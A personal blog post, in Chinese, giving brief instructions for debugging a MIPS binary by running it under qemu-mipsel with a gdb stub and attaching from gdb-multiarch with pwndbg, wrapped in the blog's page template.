<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="Gridea静态个人博客">
<meta name="description" content="世间万般兵刃，唯有过往伤人最深">
<meta name="theme-color" content="#000">
<title>mips异架构调试 | L1u66&#39;s blog</title>
<link rel="shortcut icon" href="/favicon.ico?v=1734449472245">
<link rel="stylesheet" href="/media/css/gemini.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.loli.net/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






  <meta name="description" content="mips异架构调试" />
  <meta name="keywords" content="" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="gemini">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>L1u66&#39;s blog</span>
            </a>  
          
        </div>
        
          <p class="subtitle">世间万般兵刃，唯有过往伤人最深</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-globe"></i> 首页
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives" target="_self">
                  <i class="fa fa-globe"></i> 归档
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tags" target="_self">
                  <i class="fa fa-globe"></i> 标签
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/post/about" target="_self">
                  <i class="fa fa-globe"></i> 关于
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> 友链
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">搜索</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout gemini ">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
      
        <div class="post-list-sidebar">
          <div class="sidebar-title">
            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">文章目录</span>
            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">站点概览</span>
          </div>
        </div>
      
      <div class="sidebar-body gemini" id="sidebar_body">
        
          
            
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">L1u66</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">56</span>
        <span class="site-item-stat-name language" data-lan="article">文章</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">25</span>
        <span class="site-item-stat-name language" data-lan="tag">标签</span>
      </a>
    </div>
  </div>
  
    
  
  



  <div style="width: 100%; position: relative;">
    <canvas id="canvasDiyBlock" style="width:100%;">当前浏览器不支持canvas，请更换浏览器后再试</canvas>
    <script src="/media/js/magic/clock.js"></script>
  </div>

</div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    jQuery.Velocity(hideElement, 'stop');
    jQuery.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        jQuery.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://l1u66.github.io/post/mips-yi-jia-gou-diao-shi/"> mips异架构调试 </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">发布于</span>
      <span class="publish-time" data-t="2024-08-15 23:35:09">2024-08-15</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >1<span class="language" data-lan="minute"
          >分钟</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >67<span class="pc-show language" data-lan="words"
          >字数</span
        ></span
      >
    </span>
    
  </div>
</section>

            <div class="post-body next-md-body" id="post_body">
              <p>gdb-multiarch安装<br>
<code>sudo apt-get install gdb-multiarch</code><br>
开终端</p>
<pre><code>qemu-mipsel -g 1234 ./subcall_stack
或
qemu-mipsel -g 1234 -L mipsel-linux-gnu ./subcall_stack			# -L 指定动态库
</code></pre>
<p>另起终端<br>
进入gdb-multiarch调试（pwndbg）</p>
<pre><code>$ gdb-multiarch ./subcall_stack
pwndbg&gt; set architecture mips
The target architecture is assumed to be mips
pwndbg&gt; target remote localhost:1234
</code></pre>

            </div>
            
              <div class="reward-btn">
                <div class="reward-btn-text">赞赏</div>
              </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">本文作者：</strong>
      L1u66
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">本文链接：</strong>
      <a href="https://l1u66.github.io/post/mips-yi-jia-gou-diao-shi/" title="mips异架构调试">https://l1u66.github.io/post/mips-yi-jia-gou-diao-shi/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">版权声明： </strong>
      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
    </li>
  </ul>
  <div class="tags">
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="羊城杯2024" href="https://l1u66.github.io/post/yang-cheng-bei-2024/">羊城杯2024</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="羊城杯2024" href="https://l1u66.github.io/post/yang-cheng-bei-2024/">上一篇</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="TFCCTF2024" href="https://l1u66.github.io/post/tfcctf2024/">TFCCTF2024</a>
        <a class="nav-mobile-next" title="TFCCTF2024" href="https://l1u66.github.io/post/tfcctf2024/">下一篇</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <center id="runTimeBox">
      已运行:<span id="run_time"></span>
    </center>
    <span id="busuanzi_container_site_pv">浏览数:<span id="busuanzi_value_site_pv"></span> 次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">访客数:<span id="busuanzi_value_site_uv"></span> 人</span>

    <script>
      BirthDay = new Date('');
      if (BirthDay.getTime()) {
        function runTime() {
          str = "";
          today = new Date();
          timeold = today.getTime() - BirthDay.getTime();
          msPerDay = 24 * 60 * 60 * 1000;
          e_daysold = timeold / msPerDay;
          daysold = Math.floor(e_daysold);
          str += daysold + "天";
          return str;
        }
        setInterval(function () {
          $("#run_time").html(runTime());
        }, 1000);
      } else {
        document.querySelector('.footer').removeChild(document.querySelector('#runTimeBox'));
      }
    </script>
    <div class="poweredby">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
    </div>
  </footer>
  
    
        <div class="gemini back-to-top" id="back_to_top">
          <i class="fa fa-arrow-up"></i>
          
            <span class="scrollpercent"> <span id="back_to_top_text">0</span>% </span>
            
        </div>
        
          
            
              <div class="bg-img">
                <img src="\media\images\custom-bgImg.jpg" />
              </div>
              
                
                  
                    
<link rel="stylesheet" href="/media/live2d/css/live2d.css" />
<div class="box-scale">
  <div id="landlord" style="left: 5px;bottom: px;"
    data-key="">
    <canvas id="live2d" width="500" height="560" class="live2d"></canvas>
    

      <div class="message" style="opacity:0"></div>
      <div class="live_talk_input_body">
        <div class="live_talk_input_name_body">
          <input name="name" type="text" class="live_talk_name white_input" id="AIuserName" autocomplete="off"
            placeholder="你的名字" />
        </div>
        <div class="live_talk_input_text_body">
          <input name="talk" type="text" class="live_talk_talk white_input" id="AIuserText" autocomplete="off"
            placeholder="要和我聊什么呀？" />
          <button type="button" class="live_talk_send_btn" id="talk_send">发送</button>
        </div>
      </div>
      <input name="live_talk" id="live_talk" value="1" type="hidden" />
      <div class="live_ico_box">
        <div class="live_ico_item type_info" id="showInfoBtn"></div>
        <div class="live_ico_item type_talk" id="showTalkBtn"></div>
        
        <div class="live_ico_item type_youdu" id="youduButton"></div>
        <div class="live_ico_item type_quit" id="hideButton"></div>
        <input name="live_statu_val" id="live_statu_val" value="0" type="hidden" />
        <audio src="" style="display:none;" id="live2d_bgm" data-bgm="0" preload="none"></audio>
        <input id="duType" value="douqilai" type="hidden">
        
      </div>
    
  </div>
</div>
<div id="open_live2d">召唤看板娘</div>
<script>
  var message_Path = 'https://cdn.jsdelivr.net/gh/hsxyhao/live2d.github.io@master/';
  let landlord = document.querySelector('#landlord');
  var apiKey = landlord.dataset.key;
</script>
<script type="text/javascript" src="/media/live2d/js/live2d.js"></script>
<script>
	var home_Path = document.location.protocol + '//' + window.document.location.hostname + ":" + window.document.location.port + '/';
	var userAgent = window.navigator.userAgent.toLowerCase();
	var norunAI = ["android", "iphone", "ipod", "ipad", "windows phone", "mqqbrowser", "msie", "trident/7.0"];
	var norunFlag = false;

	for (var i = 0; i < norunAI.length; i++) {
		if (userAgent.indexOf(norunAI[i]) > -1) {
			norunFlag = true;
			break;
		}
	}

	if (!window.WebGLRenderingContext) {
		norunFlag = true;
	}

	if (!norunFlag) {
		var hitFlag = false;
		var AIFadeFlag = false;
		var liveTlakTimer = null;
		var sleepTimer_ = null;
		var AITalkFlag = false;
		var talkNum = 0;
		(function () {
			function renderTip(template, context) {
				var tokenReg = /(\\)?\{([^\{\}\\]+)(\\)?\}/g;
				return template.replace(tokenReg, function (word, slash1, token, slash2) {
					if (slash1 || slash2) {
						return word.replace('\\', '');
					}
					var variables = token.replace(/\s/g, '').split('.');
					var currentObject = context;
					var i, length, variable;
					for (i = 0, length = variables.length; i < length; ++i) {
						variable = variables[i];
						currentObject = currentObject[variable];
						if (currentObject === undefined || currentObject === null) return '';
					}
					return currentObject;
				});
			}

			String.prototype.renderTip = function (context) {
				return renderTip(this, context);
			};

			var re = /x/;
			re.toString = function () {
				showMessage('哈哈，你打开了控制台，是想要看看我的秘密吗？', 5000);
				return '';
			};

			$(document).on('copy', function () {
				showMessage('你都复制了些什么呀，转载要记得加上出处哦~~', 5000);
			});

			function initTips() {
				$.ajax({
					cache: true,
					url: message_Path + 'message.json',
					dataType: "json",
					success: function (result) {
						$.each(result.mouseover, function (index, tips) {
							$(tips.selector).mouseover(function () {
								var text = tips.text;
								if (Array.isArray(tips.text)) text = tips.text[Math.floor(Math.random() * tips.text.length + 1) - 1];
								text = text.renderTip({ text: $(this).text() });
								showMessage(text, 3000);
								talkValTimer();
								clearInterval(liveTlakTimer);
								liveTlakTimer = null;
							});
							$(tips.selector).mouseout(function () {
								showHitokoto();
								if (liveTlakTimer == null) {
									liveTlakTimer = window.setInterval(function () {
										showHitokoto();
									}, 15000);
								};
							});
						});
						$.each(result.click, function (index, tips) {
							$(tips.selector).click(function () {
								if (hitFlag) {
									return false
								}
								hitFlag = true;
								setTimeout(function () {
									hitFlag = false;
								}, 8000);
								var text = tips.text;
								if (Array.isArray(tips.text)) text = tips.text[Math.floor(Math.random() * tips.text.length + 1) - 1];
								text = text.renderTip({ text: $(this).text() });
								showMessage(text, 3000);
							});
							clearInterval(liveTlakTimer);
							liveTlakTimer = null;
							if (liveTlakTimer == null) {
								liveTlakTimer = window.setInterval(function () {
									showHitokoto();
								}, 15000);
							};
						});
					}
				});
			}
			initTips();

			var text;
			if (document.referrer !== '') {
				var referrer = document.createElement('a');
				referrer.href = document.referrer;
				text = '嗨！来自 <span style="color:#0099cc;">' + referrer.hostname + '</span> 的朋友！';
				var domain = referrer.hostname.split('.')[1];
				if (domain == 'baidu') {
					text = '嗨！ 来自 百度搜索 的朋友！<br>欢迎访问<span style="color:#0099cc;">「 ' + document.title.split(' - ')[0] + ' 」</span>';
				} else if (domain == 'so') {
					text = '嗨！ 来自 360搜索 的朋友！<br>欢迎访问<span style="color:#0099cc;">「 ' + document.title.split(' - ')[0] + ' 」</span>';
				} else if (domain == 'google') {
					text = '嗨！ 来自 谷歌搜索 的朋友！<br>欢迎访问<span style="color:#0099cc;">「 ' + document.title.split(' - ')[0] + ' 」</span>';
				}
			} else {
				if (window.location.href == home_Path) { //主页URL判断，需要斜杠结尾
					var now = (new Date()).getHours();
					if (now > 23 || now <= 5) {
						text = '你是夜猫子呀？这么晚还不睡觉，明天起的来嘛？';
					} else if (now > 5 && now <= 7) {
						text = '早上好！一日之计在于晨，美好的一天就要开始了！';
					} else if (now > 7 && now <= 11) {
						text = '上午好！工作顺利嘛，不要久坐，多起来走动走动哦！';
					} else if (now > 11 && now <= 14) {
						text = '中午了，工作了一个上午，现在是午餐时间！';
					} else if (now > 14 && now <= 17) {
						text = '午后很容易犯困呢，今天的运动目标完成了吗？';
					} else if (now > 17 && now <= 19) {
						text = '傍晚了！窗外夕阳的景色很美丽呢，最美不过夕阳红~~';
					} else if (now > 19 && now <= 21) {
						text = '晚上好，今天过得怎么样？';
					} else if (now > 21 && now <= 23) {
						text = '已经这么晚了呀，早点休息吧，晚安~~';
					} else {
						text = '嗨~ 快来逗我玩吧！';
					}
				} else {
					text = '欢迎阅读<span style="color:#0099cc;">「 ' + document.title.split(' - ')[0] + ' 」</span>';
				}
			}
			showMessage(text, 12000);
		})();

		liveTlakTimer = setInterval(function () {
			showHitokoto();
		}, 15000);

		function showHitokoto() {
			if (sessionStorage.getItem("Sleepy") !== "1") {
				if (!AITalkFlag) {
					$.getJSON('https://v1.hitokoto.cn/', function (result) {
						talkValTimer();
						showMessage(result.hitokoto, 0);
					});
				}
			} else {
				hideMessage(0);
				if (sleepTimer_ == null) {
					sleepTimer_ = setInterval(function () {
						checkSleep();
					}, 200);
				}
			}
		}

		function checkSleep() {
			var sleepStatu = sessionStorage.getItem("Sleepy");
			if (sleepStatu !== '1') {
				talkValTimer();
				showMessage('你回来啦~', 0);
				clearInterval(sleepTimer_);
				sleepTimer_ = null;
			}
		}

		function showMessage(text, timeout) {
			if (Array.isArray(text)) text = text[Math.floor(Math.random() * text.length + 1) - 1];
			$('.message').stop();
			$('.message').html(text);
			$('.message').fadeTo(200, 1);
			//if (timeout === null) timeout = 5000;
			//hideMessage(timeout);
		}
		function talkValTimer() {
			$('#live_talk').val('1');
		}

		function hideMessage(timeout) {
			//$('.message').stop().css('opacity',1);
			if (timeout === null) timeout = 5000;
			$('.message').delay(timeout).fadeTo(200, 0);
		}

		function initLive2d() {
			$('#hideButton').on('click', function () {
				if (AIFadeFlag) {
					return false;
				} else {
					AIFadeFlag = true;
					localStorage.setItem("live2dhidden", "0");
					$('#landlord').fadeOut(200);
					$('#open_live2d').delay(200).fadeIn(200);
					setTimeout(function () {
						AIFadeFlag = false;
					}, 300);
				}
			});
			$('#open_live2d').on('click', function () {
				if (AIFadeFlag) {
					return false;
				} else {
					AIFadeFlag = true;
					localStorage.setItem("live2dhidden", "1");
					$('#open_live2d').fadeOut(200);
					$('#landlord').delay(200).fadeIn(200);
					setTimeout(function () {
						AIFadeFlag = false;
					}, 300);
				}
			});
			$('#youduButton').on('click', function () {
				if ($('#youduButton').hasClass('doudong')) {
					var typeIs = $('#youduButton').attr('data-type');
					$('#youduButton').removeClass('doudong');
					$('body').removeClass(typeIs);
					$('#youduButton').attr('data-type', '');
				} else {
					var duType = $('#duType').val();
					var duArr = duType.split(",");
					var dataType = duArr[Math.floor(Math.random() * duArr.length)];

					$('#youduButton').addClass('doudong');
					$('#youduButton').attr('data-type', dataType);
					$('body').addClass(dataType);
				}
			});
			if (apiKey) {
				$('#showInfoBtn').on('click', function () {
					var live_statu = $('#live_statu_val').val();
					if (live_statu == "0") {
						return
					} else {
						$('#live_statu_val').val("0");
						$('.live_talk_input_body').fadeOut(500);
						AITalkFlag = false;
						showHitokoto();
						$('#showTalkBtn').show();
						$('#showInfoBtn').hide();
					}
				});
				$('#showTalkBtn').on('click', function () {
					var live_statu = $('#live_statu_val').val();
					if (live_statu == "1") {
						return
					} else {
						$('#live_statu_val').val("1");
						$('.live_talk_input_body').fadeIn(500);
						AITalkFlag = true;
						$('#showTalkBtn').hide();
						$('#showInfoBtn').show();

					}
				});
				$('#talk_send').on('click', function () {
					var info_ = $('#AIuserText').val();
					var userid_ = $('#AIuserName').val();
					if (info_ == "") {
						showMessage('写点什么吧！', 0);
						return;
					}
					if (userid_ == "") {
						showMessage('聊之前请告诉我你的名字吧！', 0);
						return;
					}
					showMessage('思考中~', 0);
					let protocol = window.location.protocol.indexOf("s") > 0 ? "https" : "http";
					$.ajax({
						type: "get",
						url: `${protocol}://www.tuling123.com/openapi/api?key=${apiKey}&info=${info_}`,
						dataType: "json",
						success: function (res) {
							talkValTimer();
							showMessage(res.text, 0);
							$('#AIuserText').val("");
							sessionStorage.setItem("live2duser", userid_);
						},
						error: function (e) {
							talkValTimer();
							showMessage('似乎有什么错误，请和站长联系！', 0);
						}
					});
				});
			} else {
				$('#showInfoBtn').hide();
				$('#showTalkBtn').hide();
			}
			//获取音乐信息初始化
			var bgmListInfo = $('input[name=live2dBGM]');
			if (bgmListInfo.length == 0) {
				$('#musicButton').hide();
			} else {
				var bgmPlayNow = parseInt($('#live2d_bgm').attr('data-bgm'));
				var bgmPlayTime = 0;
				var live2dBGM_Num = sessionStorage.getItem("live2dBGM_Num");
				var live2dBGM_PlayTime = sessionStorage.getItem("live2dBGM_PlayTime");
				if (live2dBGM_Num) {
					if (live2dBGM_Num <= $('input[name=live2dBGM]').length - 1) {
						bgmPlayNow = parseInt(live2dBGM_Num);
					}
				}
				if (live2dBGM_PlayTime) {
					bgmPlayTime = parseInt(live2dBGM_PlayTime);
				}
				var live2dBGMSrc = bgmListInfo.eq(bgmPlayNow).val();
				$('#live2d_bgm').attr('data-bgm', bgmPlayNow);
				$('#live2d_bgm').attr('src', live2dBGMSrc);
				$('#live2d_bgm')[0].currentTime = bgmPlayTime;
				$('#live2d_bgm')[0].volume = 0.5;
				var live2dBGM_IsPlay = sessionStorage.getItem("live2dBGM_IsPlay");
				var live2dBGM_WindowClose = sessionStorage.getItem("live2dBGM_WindowClose");
				if (live2dBGM_IsPlay == '0' && live2dBGM_WindowClose == '0') {
					$('#live2d_bgm')[0].play();
					$('#musicButton').addClass('play');
				}
				sessionStorage.setItem("live2dBGM_WindowClose", '1');
				$('#musicButton').on('click', function () {
					if ($('#musicButton').hasClass('play')) {
						$('#live2d_bgm')[0].pause();
						$('#musicButton').removeClass('play');
						sessionStorage.setItem("live2dBGM_IsPlay", '1');
					} else {
						$('#live2d_bgm')[0].play();
						$('#musicButton').addClass('play');
						sessionStorage.setItem("live2dBGM_IsPlay", '0');
					}
				});
				window.onbeforeunload = function () {
					sessionStorage.setItem("live2dBGM_WindowClose", '0');
					if ($('#musicButton').hasClass('play')) {
						sessionStorage.setItem("live2dBGM_IsPlay", '0');
					}
				}
				document.getElementById('live2d_bgm').addEventListener("timeupdate", function () {
					var live2dBgmPlayTimeNow = document.getElementById('live2d_bgm').currentTime;
					sessionStorage.setItem("live2dBGM_PlayTime", live2dBgmPlayTimeNow);
				});
				document.getElementById('live2d_bgm').addEventListener("ended", function () {
					var listNow = parseInt($('#live2d_bgm').attr('data-bgm'));
					listNow++;
					if (listNow > $('input[name=live2dBGM]').length - 1) {
						listNow = 0;
					}
					var listNewSrc = $('input[name=live2dBGM]').eq(listNow).val();
					sessionStorage.setItem("live2dBGM_Num", listNow);
					$('#live2d_bgm').attr('src', listNewSrc);
					$('#live2d_bgm')[0].play();
					$('#live2d_bgm').attr('data-bgm', listNow);
				});
				document.getElementById('live2d_bgm').addEventListener("error", function () {
					$('#live2d_bgm')[0].pause();
					$('#musicButton').removeClass('play');
					showMessage('音乐似乎加载不出来了呢！', 0);
				});
			}
			//获取用户名
			var live2dUser = sessionStorage.getItem("live2duser");
			if (live2dUser !== null) {
				$('#AIuserName').val(live2dUser);
			}
			//获取位置
			var landL = sessionStorage.getItem("historywidth");
			var landB = sessionStorage.getItem("historyheight");
			if (landL == null || landB == null) {
				landL = '5px'
				landB = '0px'
			}
			$('#landlord').css('left', landL + 'px');
			$('#landlord').css('bottom', landB + 'px');
			//移动
			function getEvent() {
				return window.event || arguments.callee.caller.arguments[0];
			}
			var smcc = document.getElementById("landlord");
			var moveX = 0;
			var moveY = 0;
			var moveBottom = 0;
			var moveLeft = 0;
			var moveable = false;
			var docMouseMoveEvent = document.onmousemove;
			var docMouseUpEvent = document.onmouseup;
			smcc.onmousedown = function () {
				var ent = getEvent();
				moveable = true;
				moveX = ent.clientX;
				moveY = ent.clientY;
				var obj = smcc;
				moveBottom = parseInt(obj.style.bottom);
				moveLeft = parseInt(obj.style.left);
				if (isFirefox = navigator.userAgent.indexOf("Firefox") > 0) {
					window.getSelection().removeAllRanges();
				}
				document.onmousemove = function () {
					if (moveable) {
						var ent = getEvent();
						var x = moveLeft + ent.clientX - moveX;
						var y = moveBottom + (moveY - ent.clientY);
						obj.style.left = x + "px";
						obj.style.bottom = y + "px";
					}
				};
				document.onmouseup = function () {
					if (moveable) {
						var historywidth = obj.style.left;
						var historyheight = obj.style.bottom;
						historywidth = historywidth.replace('px', '');
						historyheight = historyheight.replace('px', '');
						sessionStorage.setItem("historywidth", historywidth);
						sessionStorage.setItem("historyheight", historyheight);
						document.onmousemove = docMouseMoveEvent;
						document.onmouseup = docMouseUpEvent;
						moveable = false;
						moveX = 0;
						moveY = 0;
						moveBottom = 0;
						moveLeft = 0;
					}
				};
			};
		}
		$(document).ready(function () {
			var AIimgSrc = [];
			let chooseLive2d = 'rem'
			if (chooseLive2d === 'histoire') {
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_00.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_01.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_02.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_03.png");
			} else if (chooseLive2d === 'rem') {
				AIimgSrc.push(message_Path + "model/rem/remu2048/texture_00.png");
			} else if (chooseLive2d === 'aoba') {
				AIimgSrc.push(message_Path + "model/aoba/textures/texture_00.png");
			} else if (chooseLive2d === 'hijiki') {
				AIimgSrc.push(message_Path + "model/hijiki/moc/hijiki.2048/texture_00.png");
			} else if (chooseLive2d === 'tororo') {
				AIimgSrc.push(message_Path + "model/tororo/moc/tororo.2048/texture_00.png");
			}
			var images = [];
			var imgLength = AIimgSrc.length;
			var loadingNum = 0;
			for (var i = 0; i < imgLength; i++) {
				images[i] = new Image();
				images[i].src = AIimgSrc[i];
				images[i].onload = function () {
					loadingNum++;
					if (loadingNum === imgLength) {
						var live2dhidden = localStorage.getItem("live2dhidden");
						if (live2dhidden === "0") {
							setTimeout(function () {
								$('#open_live2d').fadeIn(200);
							}, 1300);
						} else {
							setTimeout(function () {
								$('#landlord').fadeIn(200);
							}, 1300);
						}
						let model = '';
						if (chooseLive2d === 'histoire') {
							model = message_Path + "model/histoire/model.json";
						} else if (chooseLive2d === 'rem') {
							model = message_Path + "model/rem/model.json";
						} else if (chooseLive2d === 'aoba') {
							model = message_Path + "model/aoba/model.json";
						} else if (chooseLive2d === 'hijiki') {
							model = message_Path + "model/hijiki/hijiki.model.json";
						} else if (chooseLive2d === 'tororo') {
							model = message_Path + "model/tororo/tororo.model.json";
						}
						setTimeout(function () {
							loadlive2d("live2d", model);
						}, 1000);
						initLive2d();
						images = null;
					}
				}
			}
		});
	}
</script>
                      
                        
</div>
<script>
  let sideBarOpen = "sidebar-open";
  let body = document.body;
  let back2Top = document.querySelector("#back_to_top"),
    back2TopText = document.querySelector("#back_to_top_text"),
    drawerBox = document.querySelector("#drawer_box"),
    rightSideBar = document.querySelector(".sidebar"),
    viewport = document.querySelector("body");

  function scrollAnimation(currentY, targetY) {
    let needScrollTop = targetY - currentY;
    let _currentY = currentY;
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10);
      _currentY += dist;
      window.scrollTo(_currentY, currentY);
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY);
      } else {
        window.scrollTo(_currentY, targetY);
      }
    }, 1);
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener("scroll", function (e) {
    let percent =
      (document.scrollingElement.scrollTop /
        (document.scrollingElement.scrollHeight -
          document.scrollingElement.clientHeight)) *
      100;
    if (percent > 1 && !back2Top.classList.contains("back-top-active")) {
      back2Top.classList.add("back-top-active");
    }
    if (percent == 0) {
      back2Top.classList.remove("back-top-active");
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  let hasCacu = false;
  window.addEventListener("resize", function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // 动态调整站点概览高度
    if (
      (!hasCacu && back2Top.classList.contains("pisces")) ||
      back2Top.classList.contains("gemini")
    ) {
      let sideBar = document.querySelector(".sidebar");
